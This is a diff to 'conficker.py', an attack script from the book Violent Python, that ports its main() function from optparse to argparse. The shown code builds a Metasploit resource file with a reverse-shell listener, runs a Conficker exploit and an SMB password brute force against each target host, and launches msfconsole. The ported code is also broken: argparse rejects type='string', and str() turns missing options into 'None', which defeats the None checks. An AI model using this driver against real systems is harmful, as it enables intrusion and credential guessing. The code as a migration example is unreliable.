@@ -1,6 +1,6 @@
 ''' conficker.py from chapter 2 of Violent Python'''
 import os
-import optparse
+import argparse
 import sys
 import nmap
 
@@ -53,28 +53,33 @@ def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
 def main():
     ''' main function'''
     configFile = open('meta.rc', 'w', encoding='utf-8-sig')
-    parser = optparse.OptionParser('[-] Usage%prog ' + '-H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
-    parser.add_option('-H', dest='tgtHost', type='string', help='specify the target address[es]')
-    parser.add_option('-p', dest='lport', type='string', help='specify the listen port')
-    parser.add_option('-l', dest='lhost', type='string', help='specify the listen address')
-    parser.add_option('-F', dest='passwdFile', type='string', help='password file for SMB brute force attempt')
-    (options, args) = parser.parse_args()
-    if (options.tgtHost == None) | (options.lhost == None):
+    parser = argparse.ArgumentParser(usage='conficker.py -H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
+    parser.add_argument('-H', type='string', help='specify the target address[es]')
+    parser.add_argument('-p', type='string', help='specify the listen port')
+    parser.add_argument('-l', type='string', help='specify the listen address')
+    parser.add_argument('-F', type='string', help='password file for SMB brute force attempt')
+    args = parser.parse_args()
+    args.tgtHost = str(args.H)
+    args.lport = str(args.p)
+    args.lhost = str(args.l)
+    args.passwdFile = str(args.F)
+
+    if (args.tgtHost is None) | (args.lhost is None):
         print(parser.usage)
-        exit(0)
-    lhost = options.lhost
-    lport = options.lport
-    if lport == None:
+        sys.exit(0)
+    lhost = args.lhost
+    lport = args.lport
+    if lport is None:
         lport = '1337'
-    passwdFile = options.passwdFile
-    tgtHosts = findTgts(options.tgtHost)
+    passwdFile = args.passwdFile
+    tgtHosts = findTgts(args.tgtHost)
     setupHandler(configFile, lhost, lport)
     for tgtHost in tgtHosts:
         confickerExploit(configFile, tgtHost, lhost, lport)
-        if passwdFile != None:
+        if passwdFile is not None:
             smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
     configFile.close()
     os.system('msfconsole -r meta.rc')
-    
+
 if __name__ == '__main__':
     main()
